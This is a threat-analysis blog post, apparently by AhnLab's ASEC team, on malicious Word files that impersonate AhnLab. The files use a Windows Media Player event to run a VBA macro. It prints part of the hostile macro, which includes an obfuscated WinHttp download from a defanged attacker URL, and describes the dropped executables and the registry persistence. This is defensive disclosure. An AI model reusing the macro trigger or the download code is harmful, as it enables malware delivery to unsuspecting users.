Malicious Word Documents Using MS Media Player
(Impersonating AhnLab)

April 5, 2022

Last week, the ASEC analysis team uploaded a post named “Malicious Word File
Targeting Corporate Users Being Distributed” that contained information about a
malicious Word file. Currently, documents of the same type are being distributed with text
that impersonates AhnLab. The Word files confirmed this time download another Word file
containing malicious VBA macro via the external URL and run it. Another difference is that
the additionally downloaded Word file uses the Windows Media Player() function instead of
AutoOpen() to automatically run the VBA macro. It appears the attackers adopted a measure
to bypass anti-malware products that detect automatic execution of the AutoOpen() functionbased macro.
The confirmed filenames are as follows:
– NFT split.docx
– 202203_BTC_ETH_additional account info.docx
– Complaint for fund-raising business without permission.docx
– Fund-raising without permission.docx
– BTC_ETH automated trading account info.docx
– Cryptocurrency_investment plan.docx
Upon running the Word file, a Word macro (dotm) file is downloaded via the external URL in
the word\_rels\settings.xml.rels file and executed.

to access external URL
The downloaded file contains a macro as shown below. The attacker inserted an image and
text to prompt users to press Enable Content.

Figure 3. Word file content
When users click Enable Content, the malicious VBA macro that exists inside the externallydownloaded Word file is run.
The macro is written using the WindowsMediaPlayer1_OpenStateChange() function instead
of AutoOpen() that was used in the previously detected Word documents. This function is
executed when the openState property of the Windows Media Player object changes. When
it is run, it performs malicious activities via the RunFE() function just like in previous cases.
The following shows a part of the VBA macro code.

Private Function RunFE() As Long
Dim MR As Object
Dim bbb As String
Dim i As Long
Randomize
Call Init
For i = 0 To 8: bbb = bbb & Chr(Map1(Int(62 * Rnd()))): Next i
Set MR = CreateObject(DecodeSTR("tw7v/v2UF6/h4I4v9cL5sgLww+yTE6+Dp9E="))
'WinHttp.WinHttpRequest.5.1
Call MR.SetTimeouts(0, 2000, 2000, 5000)
#If Win64 Then
MR.Open "GET",
DecodeSTR("iBP1xrPPSNvg6tEO6/fczgngwOyJBO7f+YNJ9dPqiEjA9cSzSLHa/64myof9z1ftwMehLLDCv9R

#Else
MR.Open "GET",
DecodeSTR("iBP1xrPPSNvg6tEO6/fczgngwOyJBO7f+YNJ9dPqiEjA9cSzSLHa/64myof9z1ftwMehLLDCutJ
& "?" & bbb & "=" & bbb
'hxxp://ZVc1ijAU.naveicoipc[.]tech/ACMS/0lvNAK1t/0lvNAK1t32.acm
#End If
<생략>
Private Sub WindowsMediaPlayer1_OpenStateChange(ByVal NewState As Long)
If bFlag = False Then
Call CTD
Dim rfRes As Long
rfRes = RunFE()
If rfRes = 1 Then
bFlag = True
End If
End If
End Sub

Opening the Word document downloaded through the external URL shows Windows Media
Player within the file. The file contains Windows Media Player named WindowsMediaPlayer1
as shown below.

Figure 4. Inside the additionally downloaded Word file
The attacker enabled the AutoPlay option for the Player so that the
WindowsMediaPlayer1_OpenStateChange() function is automatically run. When the Player
is run, WindowsMediaPlayer1_OpenStateChange() inside the VBA macro is executed,
commencing malicious activities even if the user does not perform additional tasks for the
Player. Ultimately, as the attacker set the Player to run automatically, the malicious macro is
automatically run when the user clicks the Enable Content button.

Malicious activities that are performed by the macro code are the same as those explained in
the previous blog post. It downloads additional malware that suits the user’s PC environment
and runs it after injecting it into the Word process.

Afterward, it drops USOService.exe into the %ProgramData%\USOShared\Logs folder and
runs it. Then it adds the file as
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WUService registry so that it can be
continuously run.

Figure 7. Created executable
The dotm file that was downloaded from the external URL of the additionally confirmed Word
document ‘Complaint for fund-raising business without permission.docx’ creates the
message box shown below if the macro is enabled. The Word file creates a malicious file
named UpdateChecker.exe into the \AppData\Local\Microsoft\Office\ folder. It seems that the
attacker drops malware in various folders including the %ProgramData% folder.

Attacks using Word files are being continuously discovered recently. As seen from the cases
impersonating AhnLab to prompt users to enable macros, the attackers are using various
images and content to trick people. One should take caution when enabling content for the
file.
AhnLab’s anti-malware software, V3, is currently detecting and blocking the files using the
following aliases.
